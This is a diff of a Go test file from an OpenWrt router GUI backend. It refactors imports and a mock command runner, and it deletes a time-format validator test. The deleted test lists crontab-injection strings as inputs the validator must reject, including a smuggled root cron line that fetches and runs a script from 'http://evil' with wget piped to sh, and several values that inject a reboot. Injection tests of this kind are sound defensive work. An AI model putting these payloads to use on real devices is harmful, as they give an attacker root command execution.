@@ -1,8 +1,6 @@
 package services
 
 import (
-	"github.com/openwrt-travel-gui/backend/internal/guard"
-
 	"os"
 	"os/exec"
 	"path/filepath"
@@ -11,38 +9,12 @@ import (
 	"testing"
 
 	"github.com/openwrt-travel-gui/backend/internal/auth"
+	"github.com/openwrt-travel-gui/backend/internal/guard"
 	"github.com/openwrt-travel-gui/backend/internal/models"
+	"github.com/openwrt-travel-gui/backend/internal/platform"
 	"github.com/openwrt-travel-gui/backend/internal/ubus"
 	"github.com/openwrt-travel-gui/backend/internal/uci"
 )
-
-func TestValidateHHMM(t *testing.T) {
-	cases := []struct {
-		in      string
-		wantErr bool
-	}{
-		{"00:00", false},
-		{"07:30", false},
-		{"23:59", false},
-		{"24:00", true},
-		{"7:30", true},
-		{"07:60", true},
-		{"0730", true},
-		{"", true},
-		// crontab injection attempts (P0: root RCE via crontab)
-		{"00:00\n* * * * root /bin/sh -c 'wget -qO- http://evil/x|sh' #", true},
-		{"00:00\r\n* * * * root reboot", true},
-		{"00:00 * * * *", true},
-		{"00:00; reboot", true},
-		{"$(reboot)", true},
-	}
-	for _, tc := range cases {
-		err := ValidateHHMM(tc.in)
-		if (err != nil) != tc.wantErr {
-			t.Errorf("ValidateHHMM(%q) err=%v, wantErr=%v", tc.in, err, tc.wantErr)
-		}
-	}
-}
 
 func TestValidateButtonName(t *testing.T) {
 	discovered := []string{"POWER", "volume_up", "reset-factory"}
@@ -674,7 +646,7 @@ func TestSetAutoReconnect_ReplacesScriptWithCorrectMode(t *testing.T) {
 	}
 
 	w := NewWifiServiceForTesting(uci.NewMockUCI(), ubus.NewMockUbus(), &NoopWifiReloader{},
-		&MockCommandRunner{}, filepath.Join(dir, "priorities.json"),
+		&platform.MockCommandRunner{}, filepath.Join(dir, "priorities.json"),
 		filepath.Join(dir, "autoreconnect.json"), script)
 	if err := w.SetAutoReconnect(true); err != nil {
 		t.Fatalf("SetAutoReconnect: %v", err)
